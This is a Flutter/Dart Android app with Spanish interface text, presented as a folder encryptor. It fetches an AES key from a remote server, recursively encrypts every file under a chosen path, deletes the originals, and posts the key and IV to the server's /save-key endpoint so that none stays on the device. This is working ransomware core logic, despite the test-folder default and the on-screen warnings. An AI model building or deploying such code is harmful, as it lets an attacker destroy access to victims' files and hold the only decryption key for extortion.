import 'package:flutter/material.dart';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:encrypt/encrypt.dart' as encrypt;

void main() {
  runApp(const EncryptorApp());
}

class EncryptorApp extends StatelessWidget {
  const EncryptorApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Encriptador de Carpetas',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        useMaterial3: true,
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.red,
          brightness: Brightness.light,
        ),
      ),
      home: const EncryptorScreen(),
    );
  }
}

class EncryptorScreen extends StatefulWidget {
  const EncryptorScreen({Key? key}) : super(key: key);

  @override
  State<EncryptorScreen> createState() => _EncryptorScreenState();
}

class _EncryptorScreenState extends State<EncryptorScreen> {
  final TextEditingController _serverController = TextEditingController(
    text: 'http://192.168.1.100:5000',
  );
  final TextEditingController _pathController = TextEditingController(
    text: '/storage/emulated/0/Prueba',
  );

  bool _isProcessing = false;
  String _status = 'Listo para encriptar';
  double _progress = 0.0;
  int _filesProcessed = 0;
  int _totalFiles = 0;
  String? _aesKey;
  int? _profileId;
  Uint8List? _ivBytes;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    await Permission.storage.request();
    await Permission.manageExternalStorage.request();
  }

  Future<Map<String, dynamic>?> _fetchAESKey() async {
    try {
      setState(() {
        _status = 'Obteniendo llave del servidor...';
      });

      final response = await http
          .get(
            Uri.parse('${_serverController.text}/simple-key'),
          )
          .timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        final key = data['key'] as String;
        final profileId = data['profile_id'];

        setState(() {
          _status = 'Llave obtenida (Profile ID: $profileId)';
          _aesKey = key;
          _profileId = profileId;
        });

        return {'key': key, 'profile_id': profileId};
      } else {
        throw Exception('Error del servidor: ${response.statusCode}');
      }
    } catch (e) {
      setState(() {
        _status = 'Error al obtener llave: $e';
      });
      return null;
    }
  }

  Future<void> _sendKeyToServer(String key, int profileId, Uint8List iv) async {
    try {
      setState(() {
        _status = 'Enviando llave al servidor...';
      });

      final keyData = {
        'aes_key': key,
        'profile_id': profileId,
        'timestamp': DateTime.now().toIso8601String(),
        'encrypted_path': _pathController.text,
        'iv': base64.encode(iv),
        'total_files': _totalFiles,
        'device_info': {
          'platform': 'Android',
          'timestamp': DateTime.now().millisecondsSinceEpoch,
        }
      };

      final response = await http
          .post(
            Uri.parse('${_serverController.text}/save-key'),
            headers: {'Content-Type': 'application/json'},
            body: json.encode(keyData),
          )
          .timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        setState(() {
          _status = 'Llave enviada al servidor correctamente';
        });
        print('✅ Llave enviada al servidor: Profile ID $profileId');
      } else {
        throw Exception('Error al enviar llave: ${response.statusCode}');
      }
    } catch (e) {
      print('❌ Error al enviar llave: $e');
      // No lanzamos excepción para no interrumpir la encriptación
    }
  }

  Future<void> _encryptFolder() async {
    if (_isProcessing) return;

    setState(() {
      _isProcessing = true;
      _progress = 0.0;
      _filesProcessed = 0;
      _totalFiles = 0;
    });

    try {
      // 1. Obtener llave del servidor
      final keyData = await _fetchAESKey();
      if (keyData == null) {
        throw Exception('No se pudo obtener la llave');
      }

      final keyBase64 = keyData['key'];
      final profileId = keyData['profile_id'];

      // 2. Decodificar llave
      final keyBytes = base64.decode(keyBase64);
      final key = encrypt.Key(Uint8List.fromList(keyBytes));

      // 3. Generar IV
      final iv = encrypt.IV.fromSecureRandom(16);
      _ivBytes = iv.bytes;

      // 4. Verificar carpeta
      final targetDir = Directory(_pathController.text);
      if (!await targetDir.exists()) {
        throw Exception('La carpeta no existe: ${_pathController.text}');
      }

      // 5. Contar archivos
      final files = await _getAllFiles(targetDir);
      setState(() {
        _totalFiles = files.length;
        _status = 'Encriptando ${files.length} archivos...';
      });

      // 6. Encriptar cada archivo
      final encrypter =
          encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));

      for (int i = 0; i < files.length; i++) {
        final file = files[i];
        await _encryptFile(file, encrypter, iv);

        setState(() {
          _filesProcessed = i + 1;
          _progress = (_filesProcessed / _totalFiles);
          _status = 'Encriptando: $_filesProcessed de $_totalFiles';
        });
      }

      // 7. Enviar llave al servidor (NO guardar en teléfono)
      await _sendKeyToServer(keyBase64, profileId, _ivBytes!);

      setState(() {
        _status = '¡Encriptación completada! $_totalFiles archivos encriptados';
        _isProcessing = false;
      });

      _showSuccessDialog();
    } catch (e) {
      setState(() {
        _status = 'Error: $e';
        _isProcessing = false;
      });

      _showErrorDialog(e.toString());
    }
  }

  Future<List<File>> _getAllFiles(Directory dir) async {
    List<File> files = [];

    await for (var entity in dir.list(recursive: true)) {
      if (entity is File && !entity.path.endsWith('.enc')) {
        files.add(entity);
      }
    }

    return files;
  }

  Future<void> _encryptFile(
      File file, encrypt.Encrypter encrypter, encrypt.IV iv) async {
    try {
      // Leer archivo original
      final bytes = await file.readAsBytes();

      // Encriptar
      final encrypted = encrypter.encryptBytes(bytes, iv: iv);

      // Guardar archivo encriptado con extensión .enc
      final encryptedFile = File('${file.path}.enc');
      await encryptedFile.writeAsBytes(encrypted.bytes);

      // Eliminar archivo original
      await file.delete();

      print('Encriptado: ${file.path}');
    } catch (e) {
      print('Error al encriptar ${file.path}: $e');
    }
  }

  void _showSuccessDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: const Row(
          children: [
            Icon(Icons.check_circle, color: Colors.green, size: 32),
            SizedBox(width: 12),
            Text('¡Éxito!'),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('$_totalFiles archivos encriptados correctamente'),
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.blue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'Información enviada al servidor:',
                    style: TextStyle(fontWeight: FontWeight.bold),
                  ),
                  const SizedBox(height: 8),
                  Text('Profile ID: ${_profileId ?? "N/A"}'),
                  Text('Archivos: $_totalFiles'),
                  Text('Ruta: ${_pathController.text}'),
                  const SizedBox(height: 8),
                  const Text(
                    '✅ Llave y IV guardados en el servidor',
                    style: TextStyle(color: Colors.green, fontSize: 12),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 12),
            const Text(
              '⚠️ La llave NO se guardó en el dispositivo',
              style: TextStyle(
                color: Colors.orange,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cerrar'),
          ),
        ],
      ),
    );
  }

  void _showErrorDialog(String error) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: const Row(
          children: [
            Icon(Icons.error, color: Colors.red, size: 32),
            SizedBox(width: 12),
            Text('Error'),
          ],
        ),
        content: Text(error),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cerrar'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.grey[50],
      appBar: AppBar(
        title: const Text('🔒 Encriptador',
            style: TextStyle(fontWeight: FontWeight.bold)),
        backgroundColor: Colors.red,
        foregroundColor: Colors.white,
        elevation: 0,
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // Card de configuración
            Card(
              elevation: 2,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16)),
              child: Padding(
                padding: const EdgeInsets.all(20),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      'Configuración',
                      style:
                          TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
                    ),
                    const SizedBox(height: 20),
                    TextField(
                      controller: _serverController,
                      decoration: InputDecoration(
                        labelText: 'URL del Servidor',
                        hintText: 'http://192.168.1.100:5000',
                        prefixIcon: const Icon(Icons.cloud),
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                    ),
                    const SizedBox(height: 16),
                    TextField(
                      controller: _pathController,
                      decoration: InputDecoration(
                        labelText: 'Ruta a Encriptar',
                        hintText: '/storage/emulated/0/Prueba',
                        prefixIcon: const Icon(Icons.folder),
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 20),

            // Card de estado
            Card(
              elevation: 2,
              color: Colors.red[50],
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16)),
              child: Padding(
                padding: const EdgeInsets.all(20),
                child: Column(
                  children: [
                    const Icon(Icons.info_outline, size: 48, color: Colors.red),
                    const SizedBox(height: 12),
                    Text(
                      _status,
                      textAlign: TextAlign.center,
                      style: const TextStyle(fontSize: 16),
                    ),
                    if (_isProcessing) ...[
                      const SizedBox(height: 20),
                      LinearProgressIndicator(
                        value: _progress,
                        backgroundColor: Colors.red[100],
                        color: Colors.red,
                        minHeight: 8,
                        borderRadius: BorderRadius.circular(4),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        '$_filesProcessed de $_totalFiles archivos',
                        style: TextStyle(color: Colors.grey[600]),
                      ),
                    ],
                  ],
                ),
              ),
            ),
            const SizedBox(height: 20),

            // Botón de encriptar
            ElevatedButton(
              onPressed: _isProcessing ? null : _encryptFolder,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.red,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(vertical: 16),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                elevation: 4,
              ),
              child: _isProcessing
                  ? const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        SizedBox(
                          width: 20,
                          height: 20,
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: Colors.white,
                          ),
                        ),
                        SizedBox(width: 12),
                        Text('Encriptando...', style: TextStyle(fontSize: 18)),
                      ],
                    )
                  : const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.lock, size: 24),
                        SizedBox(width: 12),
                        Text('ENCRIPTAR CARPETA',
                            style: TextStyle(
                                fontSize: 18, fontWeight: FontWeight.bold)),
                      ],
                    ),
            ),
            const SizedBox(height: 20),

            // Advertencia
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.orange[100],
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.orange, width: 2),
              ),
              child: const Column(
                children: [
                  Icon(Icons.warning_amber_rounded,
                      color: Colors.orange, size: 32),
                  SizedBox(height: 8),
                  Text(
                    '⚠️ MODO SERVIDOR',
                    style: TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 16,
                      color: Colors.orange,
                    ),
                  ),
                  SizedBox(height: 8),
                  Text(
                    'Las llaves se envían AL SERVIDOR. No se guarda nada en el dispositivo. Necesitas conectar el desencriptador al servidor para recuperar las llaves.',
                    textAlign: TextAlign.center,
                    style: TextStyle(color: Colors.black87),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _serverController.dispose();
    _pathController.dispose();
    super.dispose();
  }
}
